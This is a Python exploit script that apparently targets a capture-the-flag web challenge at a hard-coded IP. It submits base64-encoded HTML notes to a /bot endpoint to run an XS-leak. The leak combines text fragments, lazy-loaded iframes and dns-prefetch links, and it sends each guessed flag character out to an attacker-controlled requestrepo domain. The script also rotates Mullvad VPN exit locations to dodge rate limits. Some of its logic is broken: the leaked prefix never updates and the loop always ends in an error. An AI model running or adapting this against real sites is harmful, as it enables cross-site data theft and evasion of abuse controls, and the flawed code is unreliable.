import time
import re
import sys
import string
import asyncio
import secrets
import requests
import requestrepo
import subprocess
import random
from base64 import b64encode as be

from base64 import b64encode as b64e
from urllib.parse import unquote_plus, quote

BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://34.10.220.48:6005"

def change_ip():
    countries = ["us", "gb", "de", "nl", "se", "fr", "ch", "no", "dk", "fi"]
    location = random.choice(countries)
    print(f"Changing IP to {location}...")
    print(subprocess.check_output(["mullvad", "relay", "set", "location", location]))
    print(subprocess.check_output(["mullvad", "reconnect"]))
    time.sleep(5)

def submit_payload(url, payload):
    try:
        assert requests.get(f"{url}/bot", params={
            "note": payload
        }).ok
        print("ok", payload)
        return True
    except AssertionError:
        return None

def main():
    client = requestrepo.RequestRepo()

    token = client.token
    domain = client.domain

    print(f"{token = }")
    print(f"{domain = }")

    leaked = "flag5n34kydn5f3tc"

    URL = f"{client._Requestrepo__protocol}://{domain}/"
    print(URL)

    ALPHA = "0123456789abcdefghijklmnopqrstuvwxyz"

    chars = []

    prev = None
    for char in ALPHA:
        second_payload = f"""
        <link rel="dns-prefetch" href="{client._Requestrepo__protocol}://{char}.{domain}/">
        """

        payload = be(f"""

        {leaked + char}
        <iframe height=50000></iframe>
        <iframe loading=lazy src="?note={quote(quote(second_payload))}"></iframe>
        {leaked + char}

        #:~:text={leaked + char}
        

        """.encode())

        print("trying", leaked + char)
        
        while not submit_payload(BASE_URL, payload):
            print("RaTELIMIT!")
            change_ip()
            time.sleep(1)

            client = requestrepo.RequestRepo(token)
            print(client.subdomain)

            second_payload = f"""
            <link rel="dns-prefetch" href="{client._Requestrepo__protocol}://{char}.{domain}/">
            """

            payload = be(f"""

            {leaked + char}
            <iframe height=50000></iframe>
            <iframe loading=lazy src="?note={quote(quote(second_payload))}"></iframe>
            {leaked + char}

            #:~:text={leaked + char}
            

            """.encode())

        time.sleep(1)

        print(requests.get("http://1.1.1.1").ok, char)



        while (data:=client.get_request().reply.splitlines()[-1].split()[0])[0] == ";":
            print("wait",data)

        print(data)

        c = data[0].lower()
        chars.append(c)
        print(chars)

        prev = char

    else:
        raise RuntimeError("Error while getting the flag: no flag found in referer header")

    print("FLAG:",leaked)

if __name__ == "__main__":
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    main()